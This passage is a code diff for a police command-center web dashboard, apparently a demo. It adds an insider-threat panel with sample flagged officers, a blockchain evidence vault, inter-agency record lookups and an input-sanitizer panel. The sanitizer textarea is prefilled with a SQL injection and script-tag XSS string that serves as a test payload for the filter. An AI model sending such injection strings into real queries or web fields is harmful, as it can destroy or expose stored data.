@@ -518,12 +518,22 @@
             </button>
             <button onclick="switchTab('traitor')" id="tabBtn-traitor" class="w-full flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium text-slate-400 hover:bg-slate-800/50 hover:text-slate-200">
               <i data-lucide="user-x" class="w-4 h-4 text-rose-400"></i>
-              <span>Traitor Detection</span>
+              <span>Traitor Sentinel</span>
               <span class="ml-auto bg-rose-500/20 text-rose-300 text-[9px] px-1.5 py-0.5 rounded">BEHAVIOR</span>
             </button>
+            <button onclick="switchTab('blockchain')" id="tabBtn-blockchain" class="w-full flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium text-slate-400 hover:bg-slate-800/50 hover:text-slate-200">
+              <i data-lucide="blocks" class="w-4 h-4 text-cyan-400"></i>
+              <span>Blockchain Vault</span>
+              <span class="ml-auto bg-cyan-500/20 text-cyan-300 text-[9px] px-1.5 py-0.5 rounded font-mono">BSA §63</span>
+            </button>
+            <button onclick="switchTab('interagency')" id="tabBtn-interagency" class="w-full flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium text-slate-400 hover:bg-slate-800/50 hover:text-slate-200">
+              <i data-lucide="building-2" class="w-4 h-4 text-amber-400"></i>
+              <span>Inter-Agency Grid</span>
+              <span class="ml-auto bg-amber-500/20 text-amber-300 text-[9px] px-1.5 py-0.5 rounded">RTO/FSL</span>
+            </button>
             <button onclick="switchTab('cctv')" id="tabBtn-cctv" class="w-full flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium text-slate-400 hover:bg-slate-800/50 hover:text-slate-200">
-              <i data-lucide="video" class="w-4 h-4 text-amber-400"></i>
-              <span>CCTV & Feeds</span>
+              <i data-lucide="video" class="w-4 h-4 text-indigo-400"></i>
+              <span>CCTV Feeds</span>
             </button>
           </nav>
         </div>
@@ -735,15 +745,23 @@
                   </span>
                   <button type="button" onclick="lockDeviceGPS(true)" id="snapGpsBtn" class="px-2.5 py-1 bg-emerald-600/90 hover:bg-emerald-500 border border-emerald-400/80 rounded-lg text-[10px] font-bold text-white flex items-center gap-1 backdrop-blur-md shadow-lg transition">
                     <i data-lucide="locate-fixed" class="w-3 h-3"></i>
-                    <span>Snap to Live GPS (Bengaluru)</span>
+                    <span>Snap to Live GPS</span>
                   </button>
+                  <select onchange="selectManualSector(this.value)" class="px-2.5 py-1 bg-slate-900/95 text-emerald-300 border border-slate-700 rounded-lg text-[10px] font-bold focus:outline-none focus:border-emerald-500 backdrop-blur-md shadow cursor-pointer">
+                    <option value="12.9716,77.5946">📍 Vidhana Soudha (HQ)</option>
+                    <option value="12.9754,77.6066">📍 MG Road / Brigade</option>
+                    <option value="12.9352,77.6245">📍 Koramangala Cyber Grid</option>
+                    <option value="12.8452,77.6602">📍 Electronic City Hub</option>
+                    <option value="12.9840,77.7289">📍 Whitefield Sector 4</option>
+                    <option value="13.1986,77.7066">📍 Kempegowda Airport</option>
+                  </select>
                   <button type="button" onclick="recenterTacticalMap()" class="px-2.5 py-1 bg-slate-900/90 hover:bg-slate-800 border border-slate-700/80 rounded-lg text-[10px] font-semibold text-slate-200 flex items-center gap-1 backdrop-blur-md shadow transition">
                     <i data-lucide="crosshair" class="w-3 h-3 text-blue-400"></i>
                     <span>Recenter</span>
                   </button>
                   <button type="button" onclick="togglePatrolSim()" id="simPatrolBtn" class="px-2.5 py-1 bg-slate-900/90 hover:bg-slate-800 border border-slate-700/80 rounded-lg text-[10px] font-semibold text-indigo-300 flex items-center gap-1 backdrop-blur-md shadow transition">
                     <i data-lucide="navigation-2" class="w-3 h-3"></i>
-                    <span>Sim Patrol Waypoint</span>
+                    <span>Sim Patrol</span>
                   </button>
                 </div>
 
@@ -816,63 +834,390 @@
           </div>
         </div>
 
-        <!-- 5. TRAITOR DETECTION TAB -->
+        <!-- 5. REFINED TRAITOR DETECTION TAB (INSIDER THREAT SENTINEL) -->
         <div id="panel-traitor" class="hidden space-y-6">
-          <div class="flex items-center justify-between">
+          <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-slate-800 pb-4">
             <div>
               <h1 class="text-2xl font-bold text-white flex items-center gap-2">
-                <span>Insider Threat & Behavioral Telemetry</span>
-                <span class="text-xs font-normal px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/30">AI Risk Scoring</span>
+                <i data-lucide="shield-alert" class="w-6 h-6 text-rose-400"></i>
+                <span>Insider Threat & Integrity Sentinel (ITIS)</span>
+                <span class="text-xs font-normal px-2.5 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/30">AI Anomaly Scoring</span>
               </h1>
-              <p class="text-xs text-slate-400">Continuous analysis of access hours, case queries, location spoofing, and bulk exfiltrations</p>
+              <p class="text-xs text-slate-400">Continuous telemetry monitoring for unauthorized case exfiltration, nocturnal access, GPS spoofing, and corruption risk vectors</p>
+            </div>
+            <div class="flex items-center gap-2">
+              <button onclick="simulateInsiderThreat()" class="px-3.5 py-2 bg-rose-600/20 hover:bg-rose-600/30 text-rose-300 border border-rose-500/30 rounded-xl text-xs font-bold transition flex items-center gap-1.5 shadow">
+                <i data-lucide="zap" class="w-3.5 h-3.5 text-rose-400"></i>
+                <span>Simulate Threat Event</span>
+              </button>
+              <button onclick="resetInsiderThreat()" class="px-3 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-xl text-xs font-semibold transition">
+                Reset
+              </button>
             </div>
           </div>
 
-          <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-            <div class="p-6 bg-[#0c121d] border border-slate-800 rounded-xl space-y-4">
-              <h3 class="font-bold text-sm text-white">Threat Level Indicator</h3>
-              <div class="flex items-center justify-center p-6 bg-slate-950/60 rounded-xl border border-slate-800">
-                <div class="text-center space-y-1">
-                  <div class="text-4xl font-extrabold text-emerald-400 mono">05<span class="text-lg text-slate-500">/100</span></div>
-                  <div class="text-xs font-bold text-emerald-300 tracking-wider">LEVEL: LOW RISK</div>
-                  <div class="text-[10px] text-slate-500">Threshold: Critical &ge; 81</div>
-                </div>
-              </div>
-              <div class="text-xs text-slate-400 space-y-1">
-                <div class="flex justify-between"><span>Off-Hours Queries:</span><span class="font-mono text-slate-200">0</span></div>
-                <div class="flex justify-between"><span>Unauthorized Access Attempts:</span><span class="font-mono text-slate-200">0</span></div>
-                <div class="flex justify-between"><span>Bulk File Downloads:</span><span class="font-mono text-slate-200">0</span></div>
+          <!-- TOP METRICS GRID -->
+          <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+            <div class="p-5 bg-[#0c121d] border border-slate-800 rounded-2xl space-y-2">
+              <div class="text-[10px] text-slate-400 font-bold uppercase tracking-wider">COMMAND ENCLAVE THREAT SCORE</div>
+              <div id="itisThreatScore" class="text-3xl font-extrabold text-emerald-400 mono">12<span class="text-sm text-slate-500 font-normal">/100</span></div>
+              <div id="itisThreatStatus" class="text-xs font-bold text-emerald-400 flex items-center gap-1">
+                <span class="w-2 h-2 rounded-full bg-emerald-400"></span>
+                <span>STATUS: LOW RISK</span>
               </div>
             </div>
 
-            <div class="lg:col-span-2 p-6 bg-[#0c121d] border border-slate-800 rounded-xl space-y-4">
-              <h3 class="font-bold text-sm text-white">Monitored Behavioral Risk Vectors</h3>
-              <div class="space-y-2 text-xs">
-                <div class="p-3 bg-slate-900/60 border border-slate-800 rounded-lg flex items-center justify-between">
-                  <div>
-                    <div class="font-semibold text-slate-200">Case Exfiltration Guard</div>
-                    <div class="text-[11px] text-slate-400">Flags unusual export volumes or cross-department queries outside jurisdiction</div>
+            <div class="p-5 bg-[#0c121d] border border-slate-800 rounded-2xl space-y-2">
+              <div class="text-[10px] text-slate-400 font-bold uppercase tracking-wider">NOCTURNAL QUERIES (2AM-5AM)</div>
+              <div id="itisNocturnalCount" class="text-3xl font-extrabold text-amber-400 mono">1 <span class="text-xs text-slate-500 font-normal font-sans">Flagged</span></div>
+              <div class="text-[11px] text-slate-400">Outside standard operational shift</div>
+            </div>
+
+            <div class="p-5 bg-[#0c121d] border border-slate-800 rounded-2xl space-y-2">
+              <div class="text-[10px] text-slate-400 font-bold uppercase tracking-wider">BULK EXFILTRATION ATTEMPTS</div>
+              <div id="itisExfilCount" class="text-3xl font-extrabold text-slate-200 mono">0 <span class="text-xs text-emerald-400 font-normal font-sans">Blocked</span></div>
+              <div class="text-[11px] text-slate-400">Two-Person authorization active</div>
+            </div>
+
+            <div class="p-5 bg-[#0c121d] border border-slate-800 rounded-2xl space-y-2">
+              <div class="text-[10px] text-slate-400 font-bold uppercase tracking-wider">INTEGRITY AUDIT LOGS</div>
+              <div class="text-3xl font-extrabold text-cyan-400 mono">100%</div>
+              <div class="text-[11px] text-cyan-300 font-mono">Chained on Blockchain</div>
+            </div>
+          </div>
+
+          <!-- FLAGGED SUSPICIOUS PERSONNEL QUEUE -->
+          <div class="p-6 bg-[#0c121d] border border-slate-800 rounded-2xl space-y-4">
+            <div class="flex items-center justify-between">
+              <div>
+                <h3 class="font-bold text-sm text-white flex items-center gap-2">
+                  <i data-lucide="user-x" class="w-4 h-4 text-rose-400"></i>
+                  <span>Monitored Personnel & High-Risk Anomaly Queue</span>
+                </h3>
+                <p class="text-xs text-slate-400">Behavioral risk scoring derived from dossier queries, geolocation teleportation, and unauthorized exports</p>
+              </div>
+              <span class="px-2.5 py-1 rounded bg-rose-500/15 text-rose-300 border border-rose-500/30 text-xs font-bold">1 SUSPECT FLAGGED</span>
+            </div>
+
+            <div class="space-y-3">
+              <!-- Officer 1: High Risk -->
+              <div id="suspectOfficerCard1" class="p-4 bg-red-950/30 border border-red-800/60 rounded-xl space-y-3">
+                <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+                  <div class="flex items-center gap-3">
+                    <div class="w-10 h-10 rounded-full bg-red-600/20 border border-red-500/40 text-red-400 flex items-center justify-center font-bold text-xs shrink-0">
+                      RS
+                    </div>
+                    <div>
+                      <div class="font-bold text-white text-xs flex items-center gap-2">
+                        <span>Constable R. Shinde</span>
+                        <span class="text-[10px] font-mono text-slate-400 font-normal">Badge: CONST-KA-4102</span>
+                        <span class="px-2 py-0.5 rounded bg-red-600/20 text-red-300 font-bold text-[10px] border border-red-500/40">CRITICAL RISK 88/100</span>
+                      </div>
+                      <div class="text-[11px] text-slate-400">Station: CPS-02 Cyber Cell • Role: Telemetry Patrol</div>
+                    </div>
                   </div>
-                  <span class="px-2 py-1 bg-emerald-500/10 text-emerald-400 rounded text-[10px] font-bold">NORMAL</span>
+                  <div class="flex items-center gap-2">
+                    <button onclick="freezeOfficerSession('CONST-KA-4102', this)" class="px-3 py-1.5 bg-red-600 hover:bg-red-500 text-white font-bold text-xs rounded-lg transition flex items-center gap-1 shadow">
+                      <i data-lucide="lock" class="w-3.5 h-3.5"></i>
+                      <span>Freeze & Revoke Token</span>
+                    </button>
+                    <button onclick="alert('Anti-Corruption Bureau (ACB) & Special Investigation Team (SIT) alerted with cryptographic audit trail.')" class="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-200 font-semibold text-xs rounded-lg transition">
+                      Alert ACB
+                    </button>
+                  </div>
                 </div>
 
-                <div class="p-3 bg-slate-900/60 border border-slate-800 rounded-lg flex items-center justify-between">
-                  <div>
-                    <div class="font-semibold text-slate-200">Geographic Telemetry Discrepancy</div>
-                    <div class="text-[11px] text-slate-400">Cross-checks active IP coordinates against real-time officer GPS beacons</div>
+                <div class="grid grid-cols-1 sm:grid-cols-3 gap-2 text-xs">
+                  <div class="p-2.5 bg-slate-950/80 rounded-lg">
+                    <div class="text-[10px] text-slate-400 uppercase font-semibold">ANOMALY VECTOR 1</div>
+                    <div class="font-bold text-red-300">Bulk CDR Export (03:15 AM)</div>
+                    <div class="text-[10px] text-slate-500">Queried 14 minister mobile records outside jurisdiction</div>
                   </div>
-                  <span class="px-2 py-1 bg-emerald-500/10 text-emerald-400 rounded text-[10px] font-bold">VERIFIED</span>
-                </div>
-
-                <div class="p-3 bg-slate-900/60 border border-slate-800 rounded-lg flex items-center justify-between">
-                  <div>
-                    <div class="font-semibold text-slate-200">Two-Person Transfer Mandate</div>
-                    <div class="text-[11px] text-slate-400">Strictly blocks solo case reassignments or evidence expungement</div>
+                  <div class="p-2.5 bg-slate-950/80 rounded-lg">
+                    <div class="text-[10px] text-slate-400 uppercase font-semibold">ANOMALY VECTOR 2</div>
+                    <div class="font-bold text-red-300">GPS Teleportation Spoofing</div>
+                    <div class="text-[10px] text-slate-500">Beacon reported Cubbon Park; active IP originated from VPN IP</div>
                   </div>
-                  <span class="px-2 py-1 bg-emerald-500/10 text-emerald-400 rounded text-[10px] font-bold">ENFORCED</span>
+                  <div class="p-2.5 bg-slate-950/80 rounded-lg">
+                    <div class="text-[10px] text-slate-400 uppercase font-semibold">INVESTIGATION STATUS</div>
+                    <div class="font-bold text-amber-300">Under Shadow Surveillance</div>
+                    <div class="text-[10px] text-slate-500">Dual-officer sanction required for dossier access</div>
+                  </div>
                 </div>
               </div>
+
+              <!-- Officer 2: Moderate Risk -->
+              <div class="p-4 bg-slate-900/60 border border-slate-800 rounded-xl flex flex-col sm:flex-row sm:items-center justify-between gap-3 text-xs">
+                <div class="flex items-center gap-3">
+                  <div class="w-9 h-9 rounded-full bg-amber-500/20 text-amber-300 flex items-center justify-center font-bold text-xs shrink-0">
+                    DP
+                  </div>
+                  <div>
+                    <div class="font-bold text-white text-xs flex items-center gap-2">
+                      <span>Sub-Inspector D. Patil</span>
+                      <span class="text-[10px] font-mono text-slate-400 font-normal">Badge: SI-MH-2026-089</span>
+                      <span class="px-2 py-0.5 rounded bg-amber-500/15 text-amber-300 font-bold text-[10px] border border-amber-500/30">MODERATE 54/100</span>
+                    </div>
+                    <div class="text-[11px] text-slate-400">3 failed MFA attempts followed by unauthorized keyword search for seized narcotics registry</div>
+                  </div>
+                </div>
+                <button onclick="alert('Watchlist status updated for SI D. Patil.')" class="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg font-semibold text-xs transition">
+                  Place on Watchlist
+                </button>
+              </div>
             </div>
+          </div>
+        </div>
+
+        <!-- NEW: POLICE OFFICER BLOCKCHAIN VAULT & EVIDENCE CUSTODY TAB -->
+        <div id="panel-blockchain" class="hidden space-y-6">
+          <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-slate-800 pb-4">
+            <div>
+              <h1 class="text-2xl font-bold text-white flex items-center gap-2">
+                <i data-lucide="blocks" class="w-6 h-6 text-cyan-400"></i>
+                <span>Sovereign Police Blockchain & Digital Evidence Vault</span>
+                <span class="text-xs font-mono font-bold px-2.5 py-0.5 rounded bg-cyan-500/20 text-cyan-300 border border-cyan-500/30">BSA 2023 §63 CERTIFIED</span>
+              </h1>
+              <p class="text-xs text-slate-400">Decentralized tamper-proof cryptographic ledger for criminal case evidence, digital seizure exhibits, and custody chains</p>
+            </div>
+            <div class="flex items-center gap-2">
+              <span class="px-3 py-1 rounded-xl bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 font-mono text-xs font-bold flex items-center gap-1.5">
+                <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+                <span>CHAIN INTACT (0 TAMPERING DETECTED)</span>
+              </span>
+            </div>
+          </div>
+
+          <!-- FORM: ANCHOR NEW EVIDENCE ON LEDGER -->
+          <div class="p-6 bg-[#0c121d] border border-cyan-500/30 rounded-2xl space-y-4 shadow-xl shadow-cyan-950/20">
+            <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+              <h3 class="font-bold text-sm text-white flex items-center gap-2">
+                <i data-lucide="file-plus" class="w-4 h-4 text-cyan-400"></i>
+                <span>Anchor Seized Evidence / Digital Exhibit onto Blockchain</span>
+              </h3>
+              <span class="text-xs text-slate-400">Section 63 Primary Admissibility</span>
+            </div>
+
+            <form onsubmit="handleAnchorEvidence(event)" class="space-y-4 text-xs">
+              <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
+                <div>
+                  <label class="block font-semibold text-slate-300 mb-1">Case Number *</label>
+                  <input id="evCaseNum" type="text" required value="SHIELD-KA-2026-000001" class="w-full bg-[#111927] border border-slate-700 rounded-lg p-2.5 text-white font-mono focus:outline-none focus:border-cyan-500">
+                </div>
+                <div>
+                  <label class="block font-semibold text-slate-300 mb-1">Exhibit Tag / Seizure ID *</label>
+                  <input id="evTag" type="text" required placeholder="e.g. EXH-04-SMARTPHONE-DUMP" class="w-full bg-[#111927] border border-slate-700 rounded-lg p-2.5 text-white font-mono focus:outline-none focus:border-cyan-500">
+                </div>
+                <div>
+                  <label class="block font-semibold text-slate-300 mb-1">Evidence Classification *</label>
+                  <select id="evType" class="w-full bg-[#111927] border border-slate-700 rounded-lg p-2.5 text-white focus:outline-none focus:border-cyan-500">
+                    <option value="DIGITAL_FORENSIC_CLONE">Digital Device / NVMe Clone (E01)</option>
+                    <option value="CCTV_FOOTAGE_EXHIBIT">CCTV Grid Video Footage (MP4/H.264)</option>
+                    <option value="NETWORK_PACKET_DUMP">Cyber Intrusion PCAP / Server Log Dump</option>
+                    <option value="FINANCIAL_LEDGER">Financial Fraud Account Ledger</option>
+                    <option value="BALLISTICS_SEIZURE">Ballistics / Forensic Weapon Exhibit</option>
+                  </select>
+                </div>
+              </div>
+
+              <div>
+                <label class="block font-semibold text-slate-300 mb-1">Seizure Chronology & Evidence Description *</label>
+                <input id="evDesc" type="text" required placeholder="Describe where item was seized, chain of custody witness, and packing seal number..." class="w-full bg-[#111927] border border-slate-700 rounded-lg p-2.5 text-white focus:outline-none focus:border-cyan-500">
+              </div>
+
+              <div class="flex flex-col sm:flex-row items-center justify-between gap-4 pt-1">
+                <span class="text-[11px] text-slate-400 flex items-center gap-1.5">
+                  <i data-lucide="shield-check" class="w-3.5 h-3.5 text-cyan-400"></i>
+                  <span>Mining block produces immutable SHA-256 seal & Section 63 BSA legal certificate</span>
+                </span>
+                <button type="submit" class="w-full sm:w-auto px-6 py-2.5 bg-cyan-600 hover:bg-cyan-500 text-white font-bold rounded-lg transition shadow-lg shadow-cyan-600/30 flex items-center justify-center gap-2">
+                  <i data-lucide="link" class="w-4 h-4"></i>
+                  <span>Mine Block & Anchor to Blockchain</span>
+                </button>
+              </div>
+            </form>
+            <div id="evAnchorResult"></div>
+          </div>
+
+          <!-- OFFICER BLOCKCHAIN EXPLORER -->
+          <div class="p-6 bg-[#0c121d] border border-slate-800 rounded-2xl space-y-4">
+            <div class="flex items-center justify-between">
+              <div>
+                <h3 class="font-bold text-sm text-white flex items-center gap-2">
+                  <i data-lucide="network" class="w-4 h-4 text-cyan-400"></i>
+                  <span>Sovereign Police Chain — Active Block Stream</span>
+                </h3>
+                <p class="text-xs text-slate-400">All sealed cases, e-FIRs, and forensic exhibits on the tamper-proof ledger</p>
+              </div>
+              <button onclick="loadOfficerBlockchainBlocks()" class="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold rounded-lg transition flex items-center gap-1">
+                <i data-lucide="refresh-cw" class="w-3.5 h-3.5"></i>
+                <span>Refresh Stream</span>
+              </button>
+            </div>
+            <div id="officerBlocksContainer" class="space-y-2 text-xs">
+              <div class="p-4 text-center text-slate-500 bg-slate-950 rounded-xl">Loading blockchain blocks...</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- NEW: INTER-AGENCY MULTI-DEPARTMENT HUB (RTO, FSL, TELECOM, CYBER IMMUNITY) -->
+        <div id="panel-interagency" class="hidden space-y-6">
+          <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-slate-800 pb-4">
+            <div>
+              <h1 class="text-2xl font-bold text-white flex items-center gap-2">
+                <i data-lucide="building-2" class="w-6 h-6 text-amber-400"></i>
+                <span>Inter-Agency Law Enforcement Grid & Cyber-Immunity Hub</span>
+              </h1>
+              <p class="text-xs text-slate-400">Integrated telemetry with RTO VAHAN/SARATHI, Forensic Laboratories (FSL), Telecom (DoT), and Central Database Cyber Immunity Sanitizer</p>
+            </div>
+          </div>
+
+          <!-- INTER-AGENCY SUB-TABS -->
+          <div class="flex flex-wrap gap-2 border-b border-slate-800 pb-2 text-xs">
+            <button onclick="switchInteragencyTab('rto')" id="iaTabBtn-rto" class="px-4 py-2 rounded-xl font-bold text-amber-300 bg-amber-500/15 border border-amber-500/30 flex items-center gap-1.5 transition">
+              <i data-lucide="car" class="w-4 h-4 text-amber-400"></i>
+              <span>RTO National Portal (VAHAN / SARATHI)</span>
+            </button>
+            <button onclick="switchInteragencyTab('fsl')" id="iaTabBtn-fsl" class="px-4 py-2 rounded-xl font-semibold text-slate-400 hover:text-white flex items-center gap-1.5 transition">
+              <i data-lucide="microscope" class="w-4 h-4 text-purple-400"></i>
+              <span>Forensic Science Lab (FSL)</span>
+            </button>
+            <button onclick="switchInteragencyTab('telecom')" id="iaTabBtn-telecom" class="px-4 py-2 rounded-xl font-semibold text-slate-400 hover:text-white flex items-center gap-1.5 transition">
+              <i data-lucide="radio-tower" class="w-4 h-4 text-blue-400"></i>
+              <span>Telecom CDR & Tower Dumps</span>
+            </button>
+            <button onclick="switchInteragencyTab('immunity')" id="iaTabBtn-immunity" class="px-4 py-2 rounded-xl font-semibold text-slate-400 hover:text-white flex items-center gap-1.5 transition">
+              <i data-lucide="shield-check" class="w-4 h-4 text-emerald-400"></i>
+              <span>Cyber-Immunity & Bug Sanitizer</span>
+            </button>
+          </div>
+
+          <!-- SUB-PANEL 1: RTO VAHAN & SARATHI SEARCH -->
+          <div id="iaPanel-rto" class="space-y-6">
+            <div class="p-6 bg-[#0c121d] border border-amber-500/30 rounded-2xl space-y-4">
+              <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-3">
+                <div>
+                  <h3 class="font-bold text-sm text-white flex items-center gap-2">
+                    <i data-lucide="car" class="w-4 h-4 text-amber-400"></i>
+                    <span>National VAHAN 4.0 Vehicle Intelligence Lookup</span>
+                  </h3>
+                  <p class="text-xs text-slate-400">Instant check across 32 Crore registered vehicles for ownership, blacklists, warrants, and ANPR sightings</p>
+                </div>
+                <div class="flex flex-wrap gap-1.5">
+                  <button onclick="document.getElementById('rtoRegInput').value='KA-01-MJ-5021'; handleRtoLookup();" class="text-xs text-amber-300 bg-amber-500/10 border border-amber-500/20 px-2 py-0.5 rounded hover:bg-amber-500/20">
+                    Fortuner (Clean)
+                  </button>
+                  <button onclick="document.getElementById('rtoRegInput').value='KA-04-NB-1109'; handleRtoLookup();" class="text-xs text-red-300 bg-red-500/15 border border-red-500/30 px-2 py-0.5 rounded hover:bg-red-500/25">
+                    🚨 Creta (WANTED HIT & RUN)
+                  </button>
+                  <button onclick="document.getElementById('rtoRegInput').value='MH-01-AB-1234'; handleRtoLookup();" class="text-xs text-slate-300 bg-slate-800 px-2 py-0.5 rounded hover:bg-slate-700">
+                    Mercedes (Mumbai)
+                  </button>
+                </div>
+              </div>
+
+              <div class="flex gap-2">
+                <input id="rtoRegInput" type="text" placeholder="Enter Registration Number (e.g. KA-01-MJ-5021 or KA-04-NB-1109)" class="flex-1 bg-[#111927] border border-slate-700 rounded-lg p-2.5 text-white font-mono uppercase focus:outline-none focus:border-amber-500">
+                <button onclick="handleRtoLookup()" class="px-6 py-2.5 bg-amber-600 hover:bg-amber-500 text-white font-bold text-xs rounded-lg transition flex items-center gap-2 shadow-lg shadow-amber-600/30">
+                  <i data-lucide="search" class="w-4 h-4"></i>
+                  <span>Query VAHAN</span>
+                </button>
+              </div>
+
+              <!-- RTO Result Container -->
+              <div id="rtoResultContainer" class="pt-2"></div>
+            </div>
+
+            <!-- SARATHI DRIVING LICENCE LOOKUP -->
+            <div class="p-6 bg-[#0c121d] border border-slate-800 rounded-2xl space-y-4">
+              <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+                <h3 class="font-bold text-sm text-white flex items-center gap-2">
+                  <i data-lucide="id-card" class="w-4 h-4 text-blue-400"></i>
+                  <span>National SARATHI 4.0 Driving Licence (DL) Verification</span>
+                </h3>
+                <span class="text-xs text-slate-400">Biometric Aadhaar UIDAI Linked</span>
+              </div>
+              <div class="flex gap-2">
+                <input id="sarathiDlInput" type="text" value="DL-KA0120220098411" placeholder="Enter Driving Licence Number" class="flex-1 bg-[#111927] border border-slate-700 rounded-lg p-2.5 text-white font-mono uppercase focus:outline-none focus:border-blue-500 text-xs">
+                <button onclick="handleDlLookup()" class="px-5 py-2.5 bg-blue-600 hover:bg-blue-500 text-white font-bold text-xs rounded-lg transition flex items-center gap-1.5">
+                  <i data-lucide="search" class="w-4 h-4"></i>
+                  <span>Verify DL</span>
+                </button>
+              </div>
+              <div id="dlResultContainer"></div>
+            </div>
+          </div>
+
+          <!-- SUB-PANEL 2: FSL DOSSIERS -->
+          <div id="iaPanel-fsl" class="hidden p-6 bg-[#0c121d] border border-slate-800 rounded-2xl space-y-4">
+            <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+              <div>
+                <h3 class="font-bold text-sm text-white flex items-center gap-2">
+                  <i data-lucide="microscope" class="w-4 h-4 text-purple-400"></i>
+                  <span>State Forensic Science Laboratory (FSL) Evidence Dossiers</span>
+                </h3>
+                <p class="text-xs text-slate-400">Forensic bitstream clones, ballistics toolmarks, and toxicology reports linked to active court FIRs</p>
+              </div>
+              <span class="px-2.5 py-1 bg-purple-500/15 text-purple-300 border border-purple-500/30 rounded text-xs font-bold">2 DOSSIERS ACTIVE</span>
+            </div>
+            <div id="fslListContainer" class="space-y-3 text-xs"></div>
+          </div>
+
+          <!-- SUB-PANEL 3: TELECOM CDR -->
+          <div id="iaPanel-telecom" class="hidden p-6 bg-[#0c121d] border border-slate-800 rounded-2xl space-y-4">
+            <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+              <div>
+                <h3 class="font-bold text-sm text-white flex items-center gap-2">
+                  <i data-lucide="radio-tower" class="w-4 h-4 text-blue-400"></i>
+                  <span>DoT / TAFCOP Lawful Telecommunication Gateway</span>
+                </h3>
+                <p class="text-xs text-slate-400">Cellular Tower Dump Geofencing & Call Detail Record (CDR) lawful authorizations under Section 94 BNSS</p>
+              </div>
+              <span class="px-2.5 py-1 bg-blue-500/15 text-blue-300 border border-blue-500/30 rounded text-xs font-bold">TAFCOP CERTIFIED</span>
+            </div>
+            <div id="telecomListContainer" class="space-y-3 text-xs"></div>
+          </div>
+
+          <!-- SUB-PANEL 4: CYBER IMMUNITY & BUG SANITIZER (ANTIVIRUS FOR NATIONAL DATABASE) -->
+          <div id="iaPanel-immunity" class="hidden p-6 bg-[#0c121d] border border-emerald-500/40 rounded-2xl space-y-5 shadow-2xl shadow-emerald-950/20">
+            <div class="border-b border-slate-800 pb-3">
+              <div class="flex items-center justify-between">
+                <div class="flex items-center gap-2">
+                  <i data-lucide="shield-check" class="w-5 h-5 text-emerald-400"></i>
+                  <h3 class="font-bold text-sm text-white">National Central Database Cyber-Immunity Gateway</h3>
+                </div>
+                <span class="px-2.5 py-0.5 rounded text-[10px] font-mono font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">ANTI-MALWARE & BUG REMOVER ACTIVE</span>
+              </div>
+              <p class="text-xs text-slate-400 mt-1">Acts as a deep packet inspection firewall that intercepts, disinfects, removes all bugs and malicious trojans from incoming data before central database commitment</p>
+            </div>
+
+            <!-- Exploit Test Playground -->
+            <div class="space-y-3 text-xs">
+              <div class="flex items-center justify-between">
+                <label class="font-semibold text-slate-300">Test Ingress Payload (Simulate Dirty External Data with Bugs/SQLi/XSS)</label>
+                <div class="flex gap-2">
+                  <button type="button" onclick="loadTestAttackPayload(1)" class="text-[11px] text-rose-300 bg-rose-500/10 border border-rose-500/20 px-2 py-0.5 rounded hover:bg-rose-500/20">Attack 1: SQL Injection</button>
+                  <button type="button" onclick="loadTestAttackPayload(2)" class="text-[11px] text-amber-300 bg-amber-500/10 border border-amber-500/20 px-2 py-0.5 rounded hover:bg-amber-500/20">Attack 2: XSS & Script Tag</button>
+                  <button type="button" onclick="loadTestAttackPayload(3)" class="text-[11px] text-purple-300 bg-purple-500/10 border border-purple-500/20 px-2 py-0.5 rounded hover:bg-purple-500/20">Attack 3: Null-Byte Traversal</button>
+                </div>
+              </div>
+
+              <textarea id="sanitizerInput" rows="3" class="w-full bg-[#111927] border border-slate-700 rounded-xl p-3 text-white font-mono text-xs focus:outline-none focus:border-emerald-500">SELECT * FROM criminal_records WHERE fir_id=101; &lt;script&gt;alert('trojan_payload')&lt;/script&gt; DROP TABLE cases; --</textarea>
+
+              <div class="flex items-center justify-between pt-1">
+                <div class="text-[11px] text-slate-400 flex items-center gap-1.5">
+                  <i data-lucide="cpu" class="w-4 h-4 text-emerald-400"></i>
+                  <span>Inspection includes SQLi pattern matching, XSS disinfection, and schema bug healing</span>
+                </div>
+                <button type="button" onclick="runCyberImmunityScan()" class="px-6 py-2.5 bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs rounded-xl shadow-lg shadow-emerald-600/30 flex items-center gap-2 transition">
+                  <i data-lucide="shield-alert" class="w-4 h-4"></i>
+                  <span>Inspect, Disinfect & Anchor to Blockchain</span>
+                </button>
+              </div>
+            </div>
+
+            <!-- Sanitizer Result Container -->
+            <div id="sanitizerResultContainer" class="pt-2"></div>
           </div>
         </div>
 
@@ -1218,17 +1563,23 @@
     }
 
     function switchTab(tab) {
-      ['overview', 'cases', 'aria', 'duty', 'traitor', 'cctv'].forEach(t => {
-        document.getElementById(`panel-${t}`).classList.add('hidden');
+      ['overview', 'cases', 'aria', 'duty', 'traitor', 'cctv', 'blockchain', 'interagency'].forEach(t => {
+        const p = document.getElementById(`panel-${t}`);
+        if (p) p.classList.add('hidden');
         const btn = document.getElementById(`tabBtn-${t}`);
